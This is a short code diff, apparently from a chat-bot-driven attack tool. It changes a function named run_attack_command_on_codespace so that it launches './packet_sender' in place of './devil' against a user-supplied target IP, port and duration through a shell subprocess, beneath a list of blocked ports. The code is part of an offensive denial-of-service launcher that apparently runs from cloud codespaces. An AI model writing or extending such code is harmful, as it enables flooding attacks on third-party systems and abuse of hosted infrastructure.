@@ -81,7 +81,8 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
-    command = f"./devil {target_ip} {target_port} {duration} 60"
+    # Updated command without the last 60
+    command = f"./packet_sender {target_ip} {target_port} {duration}"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
